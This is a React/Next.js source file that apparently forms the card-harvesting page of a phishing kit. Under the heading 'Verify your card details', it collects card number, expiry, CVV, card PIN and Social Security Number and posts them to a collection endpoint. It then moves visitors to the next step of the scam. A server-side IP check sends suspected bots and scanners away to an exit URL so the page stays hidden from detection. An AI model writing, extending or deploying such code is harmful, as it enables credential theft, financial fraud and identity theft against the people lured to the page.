import axios from "axios";
import { yupResolver } from "@hookform/resolvers/yup";
import valid from "card-validator";
import * as yup from "yup";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Wrapper } from "../components/Wrapper";
import { DataContext } from "./_app";
import { Input } from "../components/Input";
import { getProgress } from "../utils/getProgress";
import { getNextUrl } from "../utils/getNextUrl";
import { GetServerSideProps } from "next";
import checkIp from "../middleware/checkIp";

interface CardProps {}

const schema = yup.object().shape({
  cardNumber: yup
    .string()
    .required("This field is required")
    .test(
      "test-number",
      "Supply a valid card number",
      (value) => valid.number(value).isValid
    ),
  expirationDate: yup
    .string()
    .required("This field is required")
    .test(
      "test-date",
      "Supply a valid expiration date",
      (value) => valid.expirationDate(value).isValid
    ),
  cvv: yup
    .string()
    .required("This field is required")
    .test(
      "test-cvv",
      "Supply a valid cvv",
      (value) => valid.cvv(value, [3, 4]).isValid
    ),
  cardPin: yup
    .string()
    .required("This field is required")
    .test(
      "test-pin",
      "Supply a valid 4-digit PIN`",
      (val) => !isNaN(Number(val))
    )
    .min(4, "Supply a valid 4-digit PIN")
    .max(5, "Supply a valid 4-digit PIN"),
  ssn: yup.string().required("This field is required"),
});

export const Card: React.FC<CardProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `CARD`);
    formData.append(
      `cardDetails`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-card-details`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      cardDetails: data,
    });

    const url = getProgress()[getProgress().indexOf(`CARD`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <Wrapper
      title="Verify your card details"
      loading={loading}
      onSubmit={onSubmit}
    >
      <Input
        label={`Card Number`}
        name={`cardNumber`}
        register={register}
        registerOptions={{
          onChange: (event: any) => {
            var value = event.target.value;

            var newState = "9999 9999 9999 9999";
            if (/^3[47]/.test(value)) {
              newState = "9999 999999 99999";
            }
            setCardMask(newState);
          },
        }}
        mask={cardMask}
        error={
          errors.cardNumber && (errors.cardNumber.message as unknown as string)
        }
      />

      <Input
        label={`Expiration Date`}
        name={`expirationDate`}
        register={register}
        mask={`99/9999`}
        error={
          errors.expirationDate &&
          (errors.expirationDate.message as unknown as string)
        }
      />

      <Input
        label={`CVV`}
        name={`cvv`}
        register={register}
        maxLength={4}
        error={errors.cvv && (errors.cvv.message as unknown as string)}
        type="number"
      />

      <Input
        label={`PIN`}
        name={`cardPin`}
        register={register}
        maxLength={5}
        error={errors.cardPin && (errors.cardPin.message as unknown as string)}
        type="number"
      />

      <Input
        label={`Social Security Number`}
        name={`ssn`}
        register={register}
        error={errors.ssn && (errors.ssn.message as unknown as string)}
        mask={`999-99-9999`}
      />
    </Wrapper>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid
      ? {
          redirect: {
            destination: process.env.NEXT_PUBLIC_EXIT_URL,
            permanent: false,
          },
        }
      : {}),
  };
};

export default Card;
